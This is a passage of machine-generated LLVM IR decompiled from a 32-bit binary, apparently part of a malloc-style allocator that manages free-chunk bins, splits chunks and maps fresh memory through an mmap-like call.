dec_label_pc_8050dbf:                             ; preds = %dec_label_pc_8050db0
  %v1_8050dbf = add i32 %v4_8050dc7, 8
  %v2_8050dbf = inttoptr i32 %v1_8050dbf to i32*
  %v3_8050dbf = load i32, i32* %v2_8050dbf, align 4
  store i32 %v3_8050dbf, i32* @edx, align 4
  %v1_8050dc2 = add i32 %v3_8050dbf, 12
  %v2_8050dc2 = inttoptr i32 %v1_8050dc2 to i32*
  %v3_8050dc2 = load i32, i32* %v2_8050dc2, align 4
  %v15_8050dc2 = icmp eq i32 %v3_8050dc2, %v4_8050dc7
  %v1_8050dc5 = icmp eq i1 %v15_8050dc2, false
  br i1 %v1_8050dc5, label %dec_label_pc_8050dcc, label %dec_label_pc_8050dc7

dec_label_pc_8050dc7:                             ; preds = %dec_label_pc_8050dbf
  %v1_8050dc7 = add i32 %v3_8050db3, 8
  %v2_8050dc7 = inttoptr i32 %v1_8050dc7 to i32*
  %v3_8050dc7 = load i32, i32* %v2_8050dc7, align 4
  %v15_8050dc7 = icmp eq i32 %v3_8050dc7, %v4_8050dc7
  br i1 %v15_8050dc7, label %dec_label_pc_8050dd1, label %dec_label_pc_8050dcc

dec_label_pc_8050dcc:                             ; preds = %dec_label_pc_8050dc7, %dec_label_pc_8050dbf
  %v0_8050dcc = call i32 @function_8051aff()
  store i32 %v0_8050dcc, i32* %eax.global-to-local, align 4
  %v0_8050dd1.pre = load i32, i32* @ebx, align 4
  %v0_8050dd7.pre = load i32, i32* @ecx, align 4
  %v1_8050dd7.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050dd1

dec_label_pc_8050dd1:                             ; preds = %dec_label_pc_8050dc7, %dec_label_pc_8050dcc
  %v1_8050dd7 = phi i32 [ %v3_8050dbf, %dec_label_pc_8050dc7 ], [ %v1_8050dd7.pre, %dec_label_pc_8050dcc ]
  %v0_8050dd7 = phi i32 [ %v3_8050db3, %dec_label_pc_8050dc7 ], [ %v0_8050dd7.pre, %dec_label_pc_8050dcc ]
  %v0_8050dd1 = phi i32 [ %v1_8050db6, %dec_label_pc_8050dc7 ], [ %v0_8050dd1.pre, %dec_label_pc_8050dcc ]
  %v5_8050dd3 = sub i32 %v0_8050dd1, %.v1_8050bf3
  store i32 %v5_8050dd3, i32* %esi.global-to-local, align 4
  %v2_8050dd7 = add i32 %v1_8050dd7, 12
  %v3_8050dd7 = inttoptr i32 %v2_8050dd7 to i32*
  store i32 %v0_8050dd7, i32* %v3_8050dd7, align 4
  %v0_8050dda = load i32, i32* @edx, align 4
  %v1_8050dda = load i32, i32* @ecx, align 4
  %v2_8050dda = add i32 %v1_8050dda, 8
  %v3_8050dda = inttoptr i32 %v2_8050dda to i32*
  store i32 %v0_8050dda, i32* %v3_8050dda, align 4
  %v0_8050ddd = load i32, i32* %esi.global-to-local, align 4
  %v0_8050de0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050de0 = add i32 %v0_8050de0, 8
  store i32 %v1_8050de0, i32* %ecx.global-to-local, align 4
  %tmp125 = icmp ult i32 %v0_8050ddd, 16
  br i1 %tmp125, label %dec_label_pc_80512e1, label %dec_label_pc_8050de9

dec_label_pc_8050de9:                             ; preds = %dec_label_pc_8050dd1
  %v2_8050ded = add i32 %v0_8050de0, %.v1_8050bf3
  store i32 %v2_8050ded, i32* @edx, align 4
  %v1_8050df0 = or i32 %.v1_8050bf3, 1
  store i32 %v1_8050df0, i32* %ebx.global-to-local, align 4
  %v2_8050df3 = add i32 %v0_8050de0, 4
  %v3_8050df3 = inttoptr i32 %v2_8050df3 to i32*
  store i32 %v1_8050df0, i32* %v3_8050df3, align 4
  %v0_8050df6 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050df8 = or i32 %v0_8050df6, 1
  store i32 %v1_8050df8, i32* %eax.global-to-local, align 4
  %v0_8050dfb = load i32, i32* @edx, align 4
  %v1_8050dfb = load i32, i32* @ebp, align 4
  %v2_8050dfb = add i32 %v1_8050dfb, 8
  %v3_8050dfb = inttoptr i32 %v2_8050dfb to i32*
  store i32 %v0_8050dfb, i32* %v3_8050dfb, align 4
  %v0_8050dfe = load i32, i32* @edx, align 4
  %v1_8050dfe = load i32, i32* @ebp, align 4
  %v2_8050dfe = add i32 %v1_8050dfe, 12
  %v3_8050dfe = inttoptr i32 %v2_8050dfe to i32*
  store i32 %v0_8050dfe, i32* %v3_8050dfe, align 4
  %v0_8050e01 = load i32, i32* @edx, align 4
  %v1_8050e01 = add i32 %v0_8050e01, 8
  %v2_8050e01 = inttoptr i32 %v1_8050e01 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_8050e01, align 4
  %v0_8050e08 = load i32, i32* @edx, align 4
  %v1_8050e08 = add i32 %v0_8050e08, 12
  %v2_8050e08 = inttoptr i32 %v1_8050e08 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_8050e08, align 4
  %v0_8050e0f = load i32, i32* %eax.global-to-local, align 4
  %v1_8050e0f = load i32, i32* @edx, align 4
  %v2_8050e0f = add i32 %v1_8050e0f, 4
  %v3_8050e0f = inttoptr i32 %v2_8050e0f to i32*
  store i32 %v0_8050e0f, i32* %v3_8050e0f, align 4
  %v0_8050e12 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e12 = load i32, i32* @edx, align 4
  %v3_8050e12 = add i32 %v1_8050e12, %v0_8050e12
  %v4_8050e12 = inttoptr i32 %v3_8050e12 to i32*
  store i32 %v0_8050e12, i32* %v4_8050e12, align 4
  br label %dec_label_pc_80512e6

dec_label_pc_8050e1c:                             ; preds = %dec_label_pc_8050db0, %dec_label_pc_8050da0
  %v4_8050dc7 = phi i32 [ %storemerge1.pre, %dec_label_pc_8050da0 ], [ %v3_8050db3, %dec_label_pc_8050db0 ]
  store i32 %v4_8050dc7, i32* %eax.global-to-local, align 4
  %v12_8050e1c = icmp eq i32 %v4_8050dc7, %v2_8050da4
  %v1_8050e1e = icmp eq i1 %v12_8050e1c, false
  br i1 %v1_8050e1e, label %dec_label_pc_8050db0, label %dec_label_pc_8050e20

dec_label_pc_8050e20:                             ; preds = %dec_label_pc_8050e1c, %dec_label_pc_8050d92
  store i32 1, i32* %esi.global-to-local, align 4
  %v1_8050e29 = add i32 %stack_var_-40.0.ph, 1
  %v2_8050e2c = udiv i32 %v1_8050e29, 32
  store i32 %v2_8050e2c, i32* @edi, align 4
  %v1_8050e2f = mul i32 %v1_8050e29, 8
  %v2_8050e2f = add i32 %v1_8050e2f, ptrtoint (i32* @global_var_80545ec.34 to i32)
  store i32 %v2_8050e2f, i32* %ebx.global-to-local, align 4
  %v1_8050e36 = urem i32 %v1_8050e29, 32
  %v2_8050e36 = icmp eq i32 %v1_8050e36, 0
  store i32 %v1_8050e36, i32* %ecx.global-to-local, align 4
  %v1_8050e39 = mul nuw nsw i32 %v2_8050e2c, 4
  %v2_8050e39 = add i32 %v1_8050e39, ptrtoint (i32* @global_var_80548f4.38 to i32)
  %v3_8050e39 = inttoptr i32 %v2_8050e39 to i32*
  %v4_8050e39 = load i32, i32* %v3_8050e39, align 4
  store i32 %v4_8050e39, i32* %edx.global-to-local, align 4
  br i1 %v2_8050e36, label %.preheader, label %bb88

bb88:                                             ; preds = %dec_label_pc_8050e20
  %v5_8050e40 = shl i32 1, %v1_8050e36
  store i32 %v5_8050e40, i32* %esi.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_8050e20, %bb88, %dec_label_pc_8050e81
  %v1_8050e42 = phi i32 [ %v1_8050e42.pre, %dec_label_pc_8050e81 ], [ %v4_8050e39, %bb88 ], [ %v4_8050e39, %dec_label_pc_8050e20 ]
  %v0_8050e46 = phi i32 [ %v0_8050e42.pre, %dec_label_pc_8050e81 ], [ %v5_8050e40, %bb88 ], [ 1, %dec_label_pc_8050e20 ]
  %tmp89 = icmp ule i32 %v0_8050e46, %v1_8050e42
  %v1_8050e46 = icmp eq i32 %v0_8050e46, 0
  %v1_8050e48 = icmp eq i1 %v1_8050e46, false
  %or.cond = and i1 %tmp89, %v1_8050e48
  br i1 %or.cond, label %dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge, label %dec_label_pc_8050e4a.preheader

dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge: ; preds = %.preheader
  %v0_8050e717.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e76.preheader

dec_label_pc_8050e4a.preheader:                   ; preds = %.preheader
  %v0_8050e4a.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8050e4a

dec_label_pc_8050e4a:                             ; preds = %dec_label_pc_8050e4a.preheader, %dec_label_pc_8050e54
  %v0_8050e4a = phi i32 [ %v0_8050e4a.pre, %dec_label_pc_8050e4a.preheader ], [ %v1_8050e4a, %dec_label_pc_8050e54 ]
  %v1_8050e4a = add i32 %v0_8050e4a, 1
  store i32 %v1_8050e4a, i32* @edi, align 4
  %v6_8050e4e = icmp ugt i32 %v1_8050e4a, 2
  br i1 %v6_8050e4e, label %dec_label_pc_8050efd, label %dec_label_pc_8050e54

dec_label_pc_8050e54:                             ; preds = %dec_label_pc_8050e4a
  %v1_8050e54 = mul i32 %v1_8050e4a, 4
  %v2_8050e54 = add i32 %v1_8050e54, ptrtoint (i32* @global_var_80548f4.38 to i32)
  %v3_8050e54 = inttoptr i32 %v2_8050e54 to i32*
  %v4_8050e54 = load i32, i32* %v3_8050e54, align 4
  store i32 %v4_8050e54, i32* %edx.global-to-local, align 4
  %v1_8050e5b = icmp eq i32 %v4_8050e54, 0
  br i1 %v1_8050e5b, label %dec_label_pc_8050e4a, label %dec_label_pc_8050e5f

dec_label_pc_8050e5f:                             ; preds = %dec_label_pc_8050e54
  store i32 1, i32* %esi.global-to-local, align 4
  %v2_8050e66 = mul i32 %v1_8050e4a, 256
  store i32 %v2_8050e66, i32* %eax.global-to-local, align 4
  %v1_8050e69 = add i32 %v2_8050e66, ptrtoint (i32* @global_var_80545ec.34 to i32)
  store i32 %v1_8050e69, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050e76.preheader

dec_label_pc_8050e76.preheader:                   ; preds = %dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge, %dec_label_pc_8050e5f
  %v0_8050e717 = phi i32 [ %v1_8050e69, %dec_label_pc_8050e5f ], [ %v0_8050e717.pre, %dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge ]
  %esi.promoted = phi i32 [ 1, %dec_label_pc_8050e5f ], [ %v0_8050e46, %dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge ]
  %v0_8050e88 = phi i32 [ %v4_8050e54, %dec_label_pc_8050e5f ], [ %v1_8050e42, %dec_label_pc_8050e46.dec_label_pc_8050e76.preheader_crit_edge ]
  %v2_8050e764 = and i32 %v0_8050e88, %esi.promoted
  %v3_8050e765 = icmp eq i32 %v2_8050e764, 0
  br i1 %v3_8050e765, label %dec_label_pc_8050e71, label %dec_label_pc_8050e7a

dec_label_pc_8050e71:                             ; preds = %dec_label_pc_8050e76.preheader, %dec_label_pc_8050e71
  %v2_8050e7418 = phi i32 [ %v2_8050e74, %dec_label_pc_8050e71 ], [ %esi.promoted, %dec_label_pc_8050e76.preheader ]
  %v0_8050e718 = phi i32 [ %v1_8050e71, %dec_label_pc_8050e71 ], [ %v0_8050e717, %dec_label_pc_8050e76.preheader ]
  %v1_8050e71 = add i32 %v0_8050e718, 8
  %v2_8050e74 = mul i32 %v2_8050e7418, 2
  %v2_8050e76 = and i32 %v2_8050e74, %v0_8050e88
  %v3_8050e76 = icmp eq i32 %v2_8050e76, 0
  br i1 %v3_8050e76, label %dec_label_pc_8050e71, label %dec_label_pc_8050e76.dec_label_pc_8050e7a_crit_edge

dec_label_pc_8050e76.dec_label_pc_8050e7a_crit_edge: ; preds = %dec_label_pc_8050e71
  store i32 %v1_8050e71, i32* %ebx.global-to-local, align 4
  store i32 %v2_8050e74, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050e7a

dec_label_pc_8050e7a:                             ; preds = %dec_label_pc_8050e76.dec_label_pc_8050e7a_crit_edge, %dec_label_pc_8050e76.preheader
  %v0_8050e8a = phi i32 [ %v2_8050e74, %dec_label_pc_8050e76.dec_label_pc_8050e7a_crit_edge ], [ %esi.promoted, %dec_label_pc_8050e76.preheader ]
  %v1_8050ea4 = phi i32 [ %v1_8050e71, %dec_label_pc_8050e76.dec_label_pc_8050e7a_crit_edge ], [ %v0_8050e717, %dec_label_pc_8050e76.preheader ]
  %v1_8050e7a = add i32 %v1_8050ea4, 12
  %v2_8050e7a = inttoptr i32 %v1_8050e7a to i32*
  %v3_8050e7a = load i32, i32* %v2_8050e7a, align 4
  store i32 %v3_8050e7a, i32* %ecx.global-to-local, align 4
  %v12_8050e7d = icmp eq i32 %v3_8050e7a, %v1_8050ea4
  %v1_8050e7f = icmp eq i1 %v12_8050e7d, false
  br i1 %v1_8050e7f, label %dec_label_pc_8050e95, label %dec_label_pc_8050e81

dec_label_pc_8050e81:                             ; preds = %dec_label_pc_8050e7a
  %v1_8050e83 = add i32 %v3_8050e7a, 8
  store i32 %v1_8050e83, i32* %ebx.global-to-local, align 4
  %v1_8050e86 = sub i32 -1, %v0_8050e8a
  store i32 %v1_8050e86, i32* %eax.global-to-local, align 4
  %v2_8050e88 = and i32 %v0_8050e88, %v1_8050e86
  store i32 %v2_8050e88, i32* %edx.global-to-local, align 4
  %v2_8050e8a = mul i32 %v0_8050e8a, 2
  store i32 %v2_8050e8a, i32* %esi.global-to-local, align 4
  %v1_8050e8c = load i32, i32* @edi, align 4
  %v2_8050e8c = mul i32 %v1_8050e8c, 4
  %v3_8050e8c = add i32 %v2_8050e8c, ptrtoint (i32* @global_var_80548f4.38 to i32)
  %v4_8050e8c = inttoptr i32 %v3_8050e8c to i32*
  store i32 %v2_8050e88, i32* %v4_8050e8c, align 4
  %v0_8050e42.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_8050e42.pre = load i32, i32* %edx.global-to-local, align 4
  br label %.preheader

dec_label_pc_8050e95:                             ; preds = %dec_label_pc_8050e7a
  %v1_8050e95 = add i32 %v3_8050e7a, 4
  %v2_8050e95 = inttoptr i32 %v1_8050e95 to i32*
  %v3_8050e95 = load i32, i32* %v2_8050e95, align 4
  store i32 %v3_8050e95, i32* %edx.global-to-local, align 4
  %v1_8050e98 = add i32 %v3_8050e7a, 12
  %v2_8050e98 = inttoptr i32 %v1_8050e98 to i32*
  %v3_8050e98 = load i32, i32* %v2_8050e98, align 4
  store i32 %v3_8050e98, i32* %eax.global-to-local, align 4
  %v1_8050e9b = and i32 %v3_8050e95, -4
  store i32 %v1_8050e9b, i32* @edx, align 4
  %v5_8050ea0 = sub i32 %v1_8050e9b, %.v1_8050bf3
  store i32 %v5_8050ea0, i32* %esi.global-to-local, align 4
  store i32 %v3_8050e98, i32* %v2_8050e7a, align 4
  %v0_8050ea7 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ea7 = load i32, i32* %eax.global-to-local, align 4
  %v2_8050ea7 = add i32 %v1_8050ea7, 8
  %v3_8050ea7 = inttoptr i32 %v2_8050ea7 to i32*
  store i32 %v0_8050ea7, i32* %v3_8050ea7, align 4
  %v0_8050eaa = load i32, i32* %esi.global-to-local, align 4
  %tmp126 = icmp ult i32 %v0_8050eaa, 16
  br i1 %tmp126, label %dec_label_pc_8050eaf, label %dec_label_pc_8050eb6

dec_label_pc_8050eaf:                             ; preds = %dec_label_pc_8050e95
  %v0_8050eaf = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050eaf = load i32, i32* @edx, align 4
  %v2_8050eaf = add i32 %v0_8050eaf, 4
  %v3_8050eaf = add i32 %v2_8050eaf, %v1_8050eaf
  %v4_8050eaf = inttoptr i32 %v3_8050eaf to i32*
  %v5_8050eaf = load i32, i32* %v4_8050eaf, align 4
  %v6_8050eaf = or i32 %v5_8050eaf, 1
  store i32 %v6_8050eaf, i32* %v4_8050eaf, align 4
  br label %dec_label_pc_8050ef5

dec_label_pc_8050eb6:                             ; preds = %dec_label_pc_8050e95
  store i32 %.v1_8050bf3, i32* %eax.global-to-local, align 4
  %v0_8050ebf = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050ebf = add i32 %v0_8050ebf, %.v1_8050bf3
  store i32 %v2_8050ebf, i32* @edx, align 4
  %v1_8050ec2 = load i32, i32* @ebp, align 4
  %v2_8050ec2 = add i32 %v1_8050ec2, 8
  %v3_8050ec2 = inttoptr i32 %v2_8050ec2 to i32*
  store i32 %v2_8050ebf, i32* %v3_8050ec2, align 4
  %v0_8050ec5 = load i32, i32* @edx, align 4
  %v1_8050ec5 = load i32, i32* @ebp, align 4
  %v2_8050ec5 = add i32 %v1_8050ec5, 12
  %v3_8050ec5 = inttoptr i32 %v2_8050ec5 to i32*
  store i32 %v0_8050ec5, i32* %v3_8050ec5, align 4
  %v0_8050ec8 = load i32, i32* @edx, align 4
  %v1_8050ec8 = add i32 %v0_8050ec8, 8
  %v2_8050ec8 = inttoptr i32 %v1_8050ec8 to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_8050ec8, align 4
  %v0_8050ecf = load i32, i32* @edx, align 4
  %v1_8050ecf = add i32 %v0_8050ecf, 12
  %v2_8050ecf = inttoptr i32 %v1_8050ecf to i32*
  store i32 ptrtoint (i32* @global_var_80545f4.36 to i32), i32* %v2_8050ecf, align 4
  br i1 %v6_8050c4b, label %dec_label_pc_8050ede, label %dec_label_pc_8050ed8

dec_label_pc_8050ed8:                             ; preds = %dec_label_pc_8050eb6
  %v0_8050ed8 = load i32, i32* @edx, align 4
  store i32 %v0_8050ed8, i32* @global_var_80545f0.35, align 16
  br label %dec_label_pc_8050ede

dec_label_pc_8050ede:                             ; preds = %dec_label_pc_8050eb6, %dec_label_pc_8050ed8
  %v4_8050ede = or i32 %.v1_8050bf3, 1
  %v0_8050ee3 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v4_8050ede, i32* %ebx.global-to-local, align 4
  %v1_8050ee9 = or i32 %v0_8050ee3, 1
  store i32 %v1_8050ee9, i32* %eax.global-to-local, align 4
  %v1_8050eec = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050eec = add i32 %v1_8050eec, 4
  %v3_8050eec = inttoptr i32 %v2_8050eec to i32*
  store i32 %v4_8050ede, i32* %v3_8050eec, align 4
  %v0_8050eef = load i32, i32* %esi.global-to-local, align 4
  %v1_8050eef = load i32, i32* @edx, align 4
  %v3_8050eef = add i32 %v1_8050eef, %v0_8050eef
  %v4_8050eef = inttoptr i32 %v3_8050eef to i32*
  store i32 %v0_8050eef, i32* %v4_8050eef, align 4
  %v0_8050ef2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050ef2 = load i32, i32* @edx, align 4
  %v2_8050ef2 = add i32 %v1_8050ef2, 4
  %v3_8050ef2 = inttoptr i32 %v2_8050ef2 to i32*
  store i32 %v0_8050ef2, i32* %v3_8050ef2, align 4
  br label %dec_label_pc_8050ef5

dec_label_pc_8050ef5:                             ; preds = %dec_label_pc_8050eaf, %dec_label_pc_8050ede
  %v0_8050ef5 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8050ef5 = add i32 %v0_8050ef5, 8
  store i32 %v1_8050ef5, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_8050efd:                             ; preds = %dec_label_pc_8050e4a, %dec_label_pc_8050c05, %dec_label_pc_8050c0d
  %v0_8050efd = load i32, i32* @global_var_80545ec.34, align 4
  store i32 %v0_8050efd, i32* @ebx, align 4
  %v1_8050f07 = add i32 %.v1_8050bf3, 16
  store i32 %v1_8050f07, i32* @esi, align 4
  %v1_8050f0a = add i32 %v0_8050efd, 4
  %v2_8050f0a = inttoptr i32 %v1_8050f0a to i32*
  %v3_8050f0a = load i32, i32* %v2_8050f0a, align 4
  %v1_8050f11 = and i32 %v3_8050f0a, -4
  store i32 %v1_8050f11, i32* %ecx.global-to-local, align 4
  %v7_8050f14 = icmp ult i32 %v1_8050f11, %v1_8050f07
  br i1 %v7_8050f14, label %dec_label_pc_8050f34, label %dec_label_pc_8050f18

dec_label_pc_8050f18:                             ; preds = %dec_label_pc_8050efd
  %v2_8050f1c = add i32 %v0_8050efd, %.v1_8050bf3
  store i32 %v2_8050f1c, i32* @edx, align 4
  %v1_8050f1f = or i32 %.v1_8050bf3, 1
  store i32 %v1_8050f1f, i32* %eax.global-to-local, align 4
  store i32 %v2_8050f1c, i32* @global_var_80545ec.34, align 4
  store i32 %v1_8050f1f, i32* %v2_8050f0a, align 4
  %v0_8050f2b = load i32, i32* %ecx.global-to-local, align 4
  %v5_8050f2b = sub i32 %v0_8050f2b, %.v1_8050bf3
  store i32 %v5_8050f2b, i32* %ecx.global-to-local, align 4
  br label %dec_label_pc_8051287

dec_label_pc_8050f34:                             ; preds = %dec_label_pc_8050efd
  %v0_8050f34 = load i32, i32* @global_var_805491c.39, align 4
  store i32 %v0_8050f34, i32* %edx.global-to-local, align 4
  %v0_8050f3a = load i8, i8* @global_var_80545c0.33, align 64
  %v1_8050f3a = and i8 %v0_8050f3a, 2
  %v2_8050f3a = icmp eq i8 %v1_8050f3a, 0
  br i1 %v2_8050f3a, label %dec_label_pc_8050f68, label %dec_label_pc_8050f43

dec_label_pc_8050f43:                             ; preds = %dec_label_pc_8050f34
  store i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32* %stack_var_-92, align 4
  %v2_8050f4b = call i32 @function_80517bb(i32* bitcast (i8* @global_var_80545c0.33 to i32*))
  store i32 ptrtoint (i8* @global_var_80545c0.33 to i32), i32* @ebx, align 4
  %v1_8050f55 = add i32 %.v1_8050bf3, -7
  store i32 %v1_8050f55, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f55, i32* %stack_var_-92, align 4
  %v1_8050f59 = call i32 @function_8050b9e(i32 %v1_8050f55)
  store i32 %v1_8050f59, i32* %eax.global-to-local, align 4
  store i32 %v1_8050f59, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80512f7

dec_label_pc_8050f68:                             ; preds = %dec_label_pc_8050f34
  %v1_8050f68 = add i32 %v0_8050f34, -1
  store i32 %v1_8050f68, i32* @ecx, align 4
  store i32 %.v1_8050bf3, i32* @ebx, align 4
  %v1_8050f73 = load i32, i32* @global_var_805490c.40, align 4
  %v7_8050f73 = icmp ult i32 %.v1_8050bf3, %v1_8050f73
  br i1 %v7_8050f73, label %dec_label_pc_8051035, label %dec_label_pc_8050f7f

dec_label_pc_8050f7f:                             ; preds = %dec_label_pc_8050f68
  %v0_8050f7f = load i32, i32* @global_var_8054910.41, align 16
  store i32 %v0_8050f7f, i32* %eax.global-to-local, align 4
  %v1_8050f84 = load i32, i32* @global_var_8054914.42, align 4
  %v5_8050f8a = icmp slt i32 %v0_8050f7f, %v1_8050f84
  br i1 %v5_8050f8a, label %dec_label_pc_8050f90, label %dec_label_pc_8051035

dec_label_pc_8050f90:                             ; preds = %dec_label_pc_8050f7f
  %v2_8050f92 = add i32 %.v1_8050bf3, 10
  %v3_8050f92 = add i32 %v2_8050f92, %v0_8050f34
  %v1_8050f96 = sub i32 0, %v0_8050f34
  store i32 %v1_8050f96, i32* %eax.global-to-local, align 4
  %v2_8050f98 = and i32 %v3_8050f92, %v1_8050f96
  store i32 %v2_8050f98, i32* @ebx, align 4
  %tmp127 = icmp ugt i32 %v2_8050f98, %.v1_8050bf3
  br i1 %tmp127, label %dec_label_pc_8050fa4, label %dec_label_pc_8051035

dec_label_pc_8050fa4:                             ; preds = %dec_label_pc_8050f90
  store i32 0, i32* %stack_var_-92, align 4
  %v8_8050fb1 = call i32 @function_80523e0(i32 0, i32 %v2_8050f98, i32 3, i32 34, i32 0, i32 0, i32 %v1_8050f68, i32 %v1_8050f68)
  store i32 %v8_8050fb1, i32* %eax.global-to-local, align 4
  store i32 %v8_8050fb1, i32* @edx, align 4
  %v10_8050fbb = icmp eq i32 %v8_8050fb1, -1
  br i1 %v10_8050fbb, label %dec_label_pc_8050fa4.dec_label_pc_8051035_crit_edge, label %dec_label_pc_8050fc0

dec_label_pc_8050fa4.dec_label_pc_8051035_crit_edge: ; preds = %dec_label_pc_8050fa4
  %v0_8051035.pre = load i32, i32* @global_var_80545ec.34, align 4
  br label %dec_label_pc_8051035

dec_label_pc_8050fc0:                             ; preds = %dec_label_pc_8050fa4
  %v1_8050fc2 = urem i32 %v8_8050fb1, 8
  %v2_8050fc2 = icmp eq i32 %v1_8050fc2, 0
  store i32 %v1_8050fc2, i32* %ecx.global-to-local, align 4
  br i1 %v2_8050fc2, label %dec_label_pc_8050fda, label %dec_label_pc_8050fc7

dec_label_pc_8050fc7:                             ; preds = %dec_label_pc_8050fc0
  %v0_8050fcc = load i32, i32* @ebx, align 4
  %v2_8050fce = sub nsw i32 8, %v1_8050fc2
  store i32 %v2_8050fce, i32* %eax.global-to-local, align 4
  %v2_8050fd0 = add i32 %v2_8050fce, %v8_8050fb1
  store i32 %v2_8050fd0, i32* @edx, align 4
  %v2_8050fd2 = sub i32 %v0_8050fcc, %v2_8050fce
  store i32 %v2_8050fd2, i32* %esi.global-to-local, align 4
  %v2_8050fd4 = inttoptr i32 %v2_8050fd0 to i32*
  store i32 %v2_8050fce, i32* %v2_8050fd4, align 4
  br label %dec_label_pc_8050fe2

dec_label_pc_8050fda:                             ; preds = %dec_label_pc_8050fc0
  %v1_8050fda = inttoptr i32 %v8_8050fb1 to i32*
  store i32 0, i32* %v1_8050fda, align 4
  br label %dec_label_pc_8050fe2

dec_label_pc_8050fe2:                             ; preds = %dec_label_pc_8050fc7, %dec_label_pc_8050fda
  %storemerge.in = phi i32* [ @esi, %dec_label_pc_8050fc7 ], [ @ebx, %dec_label_pc_8050fda ]
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v1_8050fe2 = or i32 %storemerge, 2
  %v1_8050fe5 = load i32, i32* @edx, align 4
  %v2_8050fe5 = add i32 %v1_8050fe5, 4
  %v3_8050fe5 = inttoptr i32 %v2_8050fe5 to i32*
  store i32 %v1_8050fe2, i32* %v3_8050fe5, align 4
  %v0_8050fe8 = load i32, i32* @global_var_8054910.41, align 16
  %v1_8050fed = add i32 %v0_8050fe8, 1
  store i32 %v1_8050fed, i32* %eax.global-to-local, align 4
  store i32 %v1_8050fed, i32* @global_var_8054910.41, align 16
  %v1_8050ff3 = load i32, i32* @global_var_8054918.43, align 8
  %v7_8050ff9 = icmp sgt i32 %v1_8050fed, %v1_8050ff3
  br i1 %v7_8050ff9, label %dec_label_pc_8050ffb, label %dec_label_pc_8051000

dec_label_pc_8050ffb:                             ; preds = %dec_label_pc_8050fe2
  store i32 %v1_8050fed, i32* @global_var_8054918.43, align 8
  br label %dec_label_pc_8051000

dec_label_pc_8051000:                             ; preds = %dec_label_pc_8050fe2, %dec_label_pc_8050ffb
  %v0_8051000 = load i32, i32* @global_var_8054924.44, align 4
  %v1_8051005 = load i32, i32* @ebx, align 4
  %v2_8051005 = add i32 %v1_8051005, %v0_8051000
  store i32 %v2_8051005, i32* %eax.global-to-local, align 4
  store i32 %v2_8051005, i32* @global_var_8054924.44, align 4
  %v1_805100c = load i32, i32* @global_var_8054930.45, align 16
  %tmp128 = icmp ugt i32 %v2_8051005, %v1_805100c
  br i1 %tmp128, label %dec_label_pc_8051014, label %dec_label_pc_8051019

dec_label_pc_8051014:                             ; preds = %dec_label_pc_8051000
  store i32 %v2_8051005, i32* @global_var_8054930.45, align 16
  br label %dec_label_pc_8051019

dec_label_pc_8051019:                             ; preds = %dec_label_pc_8051000, %dec_label_pc_8051014
  %v1_8051019 = load i32, i32* @global_var_8054928.46, align 8
  %v2_8051019 = add i32 %v1_8051019, %v2_8051005
  store i32 %v2_8051019, i32* %eax.global-to-local, align 4
  %v1_805101f = load i32, i32* @global_var_8054934.47, align 4
  %tmp129 = icmp ugt i32 %v2_8051019, %v1_805101f
  br i1 %tmp129, label %dec_label_pc_805102b, label %dec_label_pc_8050c7c

dec_label_pc_805102b:                             ; preds = %dec_label_pc_8051019
  store i32 %v2_8051019, i32* @global_var_8054934.47, align 4
  br label %dec_label_pc_8050c7c

dec_label_pc_8051035:                             ; preds = %dec_label_pc_8050f90, %dec_label_pc_8050fa4.dec_label_pc_8051035_crit_edge, %dec_label_pc_8050f7f, %dec_label_pc_8050f68
  %v0_8051035 = phi i32 [ %v0_8051035.pre, %dec_label_pc_8050fa4.dec_label_pc_8051035_crit_edge ], [ %v0_8050efd, %dec_label_pc_8050f7f ], [ %v0_8050efd, %dec_label_pc_8050f90 ], [ %v0_8050efd, %dec_label_pc_8050f68 ]
  store i32 %v0_8051035, i32* %eax.global-to-local, align 4
  %v1_805103e = add i32 %v0_8051035, 4
  %v2_805103e = inttoptr i32 %v1_805103e to i32*
  %v3_805103e = load i32, i32* %v2_805103e, align 4
  %v1_8051048 = and i32 %v3_805103e, -4
  %v2_8051048 = icmp eq i32 %v1_8051048, 0
  store i32 %v1_8051048, i32* @ebp, align 4
  %v1_805104b = load i32, i32* @global_var_8054908.48, align 8
  %v2_805104b = add i32 %v1_805104b, %v1_8050f07
  store i32 %v2_805104b, i32* %eax.global-to-local, align 4
  %v0_8051051 = load i8, i8* @global_var_8054920.49, align 32
  %v1_8051051 = urem i8 %v0_8051051, 2
  %v2_8051051 = icmp eq i8 %v1_8051051, 0
  br i1 %v2_8051051, label %dec_label_pc_805105c, label %dec_label_pc_805105a

dec_label_pc_805105a:                             ; preds = %dec_label_pc_8051035
  %v2_805105a = sub i32 %v2_805104b, %v1_8051048
  store i32 %v2_805105a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805105c

